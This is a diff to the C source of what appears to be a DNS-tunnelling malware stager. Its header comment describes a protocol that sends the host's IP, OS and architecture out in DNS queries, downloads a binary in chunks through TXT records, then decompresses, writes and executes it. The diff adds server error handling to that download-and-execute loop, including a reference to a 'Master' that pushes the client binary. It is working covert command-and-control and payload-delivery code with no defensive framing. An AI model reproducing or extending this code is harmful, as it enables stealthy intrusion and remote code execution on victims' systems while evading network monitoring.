@@ -17,11 +17,11 @@
  * 
  * Protocol Flow:
  * 1. Stager sends: base36(STG|IP|OS|ARCH) via DNS subdomain query
- * 2. Server responds: base36(META|<total_chunks>) in TXT record
- * 3. Stager sends: base36(ACK|0) to request chunk 0
- * 4. Server responds: base36(CHUNK|<base64_data>) in TXT record
- * 5. Loop ACK/CHUNK for all chunks
- * 6. Stager: decode base36 → assemble base64 → decode → decompress → write → execute
+ * 2. Server responds: base36(META|<session_id>|<total_chunks>) in TXT record
+ * 3. Stager sends: base36(CHUNK|0|IP|session_id) to request chunk 0
+ * 4. Server responds: CHUNK|<base64_data> in TXT record (PLAIN TEXT, not base36)
+ * 5. Loop CHUNK requests for all chunks
+ * 6. Stager: assemble base64 → decode → decompress → write → execute
  */
 
 #include <stdio.h>
@@ -1046,6 +1046,22 @@ int main(int argc, char *argv[]) {
     DEBUG_PRINT("[*] Response: %s\n", response);
     DEBUG_PRINT("[*] ========================================\n");
     
+    // Check for ERROR responses from server
+    if (strncmp(response, "ERROR", 5) == 0) {
+    DEBUG_PRINT("[!] ========================================\n");
+    DEBUG_PRINT("[!] Server returned ERROR response\n");
+    DEBUG_PRINT("[!] Error: %s\n", response);
+    DEBUG_PRINT("[!] ========================================\n");
+        // Common errors:
+        // ERROR|NO_CACHE - No cached client binary on this DNS server
+        // ERROR|BINARY_NOT_FOUND - Standalone mode, binary missing
+        if (strstr(response, "NO_CACHE") != NULL) {
+    DEBUG_PRINT("[!] No cached binary on this DNS server\n");
+    DEBUG_PRINT("[!] The Master may not have pushed the client binary yet\n");
+        }
+        return 1;
+    }
+    
     // Parse metadata response: META|<session_id>|<total_chunks>
     if (strncmp(response, "META|", 5) != 0) {
     DEBUG_PRINT("[!] ========================================\n");
@@ -1126,6 +1142,13 @@ int main(int argc, char *argv[]) {
         
         DIAG_PRINT("[DIAG] Received response for chunk %d: %.80s... (len=%zu)\n", 
                 i, response, strlen(response));
+        
+        // Check for ERROR responses from server
+        if (strncmp(response, "ERROR", 5) == 0) {
+            DIAG_PRINT("[DIAG] Server returned ERROR for chunk %d: %s\n", i, response);
+    DEBUG_PRINT("[!] ERROR receiving chunk %d: %s\n", i, response);
+            goto cleanup;
+        }
         
         // Parse chunk response: CHUNK|<data>
         if (strncmp(response, "CHUNK|", 6) != 0) {
